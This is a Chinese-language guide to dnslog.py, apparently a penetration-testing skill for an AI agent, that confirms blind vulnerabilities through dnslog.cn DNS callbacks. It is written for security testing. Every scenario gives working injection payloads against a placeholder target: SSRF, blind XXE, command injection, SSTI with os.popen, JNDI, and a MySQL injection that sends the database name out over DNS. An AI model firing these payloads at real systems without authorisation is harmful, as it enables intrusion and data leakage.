# dnslog.py — DNS 回调验证工具完整用法

## 概述

`dnslog.py` 是 vibe-pentest 渗透测试中**OOB（Out-of-Band）漏洞验证的专用工具**，基于 [dnslog.cn](http://dnslog.cn) 服务实现 DNS 查询记录获取。

- 纯 Python 实现，仅依赖 `requests` 库
- Cookie 会话自动持久化到临时文件，确保 get_domain 和 get_records 使用同一会话
- 适用于所有无回显漏洞的 OOB 验证场景

**依赖**：`pip install requests`

**位置**：`{SKILL_ROOT}/scripts/dnslog.py`

---

## 适用漏洞类型

| 漏洞类型 | 验证方式 | 典型 Payload 示例 |
|----------|---------|------------------|
| **SSRF（OOB 验证）** | 通过 DNS 请求确认服务端发起了对外请求 | `http://target/api?url=http://abc123.dnslog.cn` |
| **盲 XXE（OOB）** | 通过外部实体引用触发 DNS 查询 | `<!ENTITY % xxe SYSTEM "http://abc123.dnslog.cn/evil.dtd">` |
| **命令注入（盲）** | 通过 DNS 查询确认命令被执行 | `; nslookup abc123.dnslog.cn` 或 `\| ping abc123.dnslog.cn` |
| **SQL 盲注（OOB 外带）** | 通过数据库 DNS 外带函数确认注入 | MySQL: `LOAD_FILE('\\\\abc123.dnslog.cn\\x')`  Oracle: `UTL_HTTP.REQUEST('http://abc123.dnslog.cn')` |
| **JNDI 注入** | 通过 DNS 回调确认 JNDI lookup 被触发 | `${jndi:dns://abc123.dnslog.cn}` |
| **SSTI（盲）** | 通过 DNS 查询确认模板表达式被执行 | `{{request.application.__globals__.__builtins__.__import__('os').popen('nslookup abc123.dnslog.cn').read()}}` |

---

## 标准 3 步工作流

### Step 1: 获取临时域名

```bash
python {SKILL_ROOT}/scripts/dnslog.py get_domain
```

输出示例：
```json
{
  "status": "success",
  "domain": "abc123.dnslog.cn",
  "message": "成功获取临时域名: abc123.dnslog.cn",
  "usage": "使用此域名进行DNS查询测试，例如: nslookup abc123.dnslog.cn",
  "note": "域名有效期为 24 小时，请及时查询记录"
}
```

提取域名：从 JSON 的 `domain` 字段获取，后续步骤使用。

### Step 2: 在漏洞 Payload 中嵌入该域名

通过 `http_test.py` 或其他方式将域名注入到目标，触发 DNS 查询。见下方场景模板。

### Step 3: 查询 DNS 记录

```bash
# 立即查询
python {SKILL_ROOT}/scripts/dnslog.py get_records <域名>

# 等待 N 秒后查询（推荐，给目标时间处理）
python {SKILL_ROOT}/scripts/dnslog.py get_records <域名> 5
```

---

## 漏洞验证场景模板

### 场景1: SSRF OOB 验证

```bash
# Step 1: 获取域名
DOMAIN=$(python {SKILL_ROOT}/scripts/dnslog.py get_domain | python -c "import sys,json; print(json.load(sys.stdin)['domain'])")

# Step 2: 通过 SSRF 参数触发 DNS 查询
python {SKILL_ROOT}/scripts/http_test.py \
  --url "http://target.com/api/fetch?url=http://$DOMAIN" \
  --method GET \
  --timeout 10 \
  --show-command --show-summary --include-headers \
  --response-max-lines 20

# Step 3: 等待 5 秒后查询记录
python {SKILL_ROOT}/scripts/dnslog.py get_records "$DOMAIN" 5
```

**判断标准**：`status` 为 `success` 且 `record_count` > 0 → SSRF 漏洞 confirmed

### 场景2: 盲 XXE DNS 回调

```bash
# Step 1: 获取域名
DOMAIN=$(python {SKILL_ROOT}/scripts/dnslog.py get_domain | python -c "import sys,json; print(json.load(sys.stdin)['domain'])")

# Step 2: 发送含外部实体的 XML
python {SKILL_ROOT}/scripts/http_test.py \
  --url "http://target.com/api/import" \
  --method POST \
  --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://'"$DOMAIN"'/evil.dtd"> %xxe; ]><root>test</root>' \
  --headers '{"Content-Type":"application/xml"}' \
  --timeout 10 \
  --show-command --show-summary --include-headers

# Step 3: 查记录
python {SKILL_ROOT}/scripts/dnslog.py get_records "$DOMAIN" 5
```

**判断标准**：`status` 为 `success` 且 `record_count` > 0 → XXE 漏洞 confirmed

### 场景3: 命令注入 OOB 验证

```bash
# Step 1: 获取域名
DOMAIN=$(python {SKILL_ROOT}/scripts/dnslog.py get_domain | python -c "import sys,json; print(json.load(sys.stdin)['domain'])")

# Step 2: 通过命令注入触发 DNS 查询
python {SKILL_ROOT}/scripts/http_test.py \
  --url "http://target.com/api/ping?host=\|nslookup+$DOMAIN" \
  --method GET \
  --timeout 15 \
  --show-command --show-summary --include-headers

# Step 3: 查记录
python {SKILL_ROOT}/scripts/dnslog.py get_records "$DOMAIN" 8
```

**判断标准**：`status` 为 `success` 且 `record_count` > 0 → 命令注入 confirmed

### 场景4: SQL 盲注 OOB 外带（MySQL）

```bash
# Step 1: 获取域名
DOMAIN=$(python {SKILL_ROOT}/scripts/dnslog.py get_domain | python -c "import sys,json; print(json.load(sys.stdin)['domain'])")

# Step 2: 通过 SQL 注入触发 DNS 查询
python {SKILL_ROOT}/scripts/http_test.py \
  --url "http://target.com/api/user?id=1'+UNION+SELECT+LOAD_FILE(CONCAT('\\\\\\',(SELECT+database()),'.$DOMAIN\\\abc'))--+" \
  --method GET \
  --timeout 15 \
  --show-command --show-summary --include-headers

# Step 3: 查记录
python {SKILL_ROOT}/scripts/dnslog.py get_records "$DOMAIN" 8
```

**判断标准**：`status` 为 `success` 且 `record_count` > 0，且 DNS 记录中可能包含外带的数据库名 → SQLi confirmed

### 场景5: JNDI 注入 DNS 回调

```bash
# Step 1: 获取域名
DOMAIN=$(python {SKILL_ROOT}/scripts/dnslog.py get_domain | python -c "import sys,json; print(json.load(sys.stdin)['domain'])")

# Step 2: 通过 JNDI 参数触发 DNS 查询
python {SKILL_ROOT}/scripts/http_test.py \
  --url "http://target.com/api/lookup?jndiName=dns://$DOMAIN" \
  --method GET \
  --timeout 10 \
  --show-command --show-summary --include-headers

# Step 3: 查记录
python {SKILL_ROOT}/scripts/dnslog.py get_records "$DOMAIN" 5
```

**判断标准**：`status` 为 `success` 且 `record_count` > 0 → JNDI 注入 confirmed

---

## 命令参数

| 操作 | 命令格式 | 说明 |
|------|---------|------|
| `get_domain` | `python dnslog.py get_domain` | 获取临时域名，返回 JSON 含 `domain` 字段 |
| `get_records` | `python dnslog.py get_records <域名>` | 立即查询 DNS 记录 |
| `get_records` + 等待 | `python dnslog.py get_records <域名> <秒>` | 等待 N 秒后查询 DNS 记录 |

---

## 响应状态说明

| status 值 | 含义 | 下一步 |
|-----------|------|--------|
| `success` | 有 DNS 查询记录 | 漏洞 confirmed，记录证据 |
| `no_records` | 暂无记录 | 尝试增大 wait_time、更换 payload、或标记为未触发 |
| `error` | 请求失败 | 检查网络、稍后重试 |

---

## 注意事项

- 临时域名有效期为 **24 小时**，超时需重新获取
- DNS 查询可能有 **3-10 秒延迟**，建议 `get_records` 时设置 `wait_time=5`
- Cookie 持久化在系统临时目录，同一主机上多次调用自动使用同一会话
- 目标必须能出网访问公网 DNS（dnslog.cn）
- 一个域名可重复用于多个 payload，适合多轮验证
- 不要在一次测试中获取过多域名，复用同一域名即可
